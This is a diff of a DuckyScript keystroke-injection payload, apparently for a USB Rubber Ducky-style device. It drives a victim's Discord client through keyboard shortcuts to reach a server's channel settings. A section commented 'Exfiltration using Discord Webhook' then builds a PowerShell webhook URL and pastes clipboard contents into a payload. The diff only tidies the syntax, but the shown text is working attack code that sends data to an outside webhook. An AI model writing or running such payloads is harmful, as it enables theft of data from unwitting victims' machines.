@@ -32,9 +32,7 @@ DELAY 6000
 REM Search by Discord keyboard shortcut and open it
 CTRL k
 DELAY 500
-STRING *
-STRING #SERVER_NAME
-ENTER
+STRINGLN *#SERVER_NAME
 DELAY 500
 
 REM Go to first channel and open the settings
@@ -135,9 +133,7 @@ ENTER
 DELAY 2000
 
 REM Exfiltration using Discord Webhook
-STRING $WebhookUrl = "
-STRING #DISCORD_WEBHOOK
-STRINGLN "
+STRINGLN $WebhookUrl = "#DISCORD_WEBHOOK"
 
 STRING $Payload = @{content = "
 CTRL v
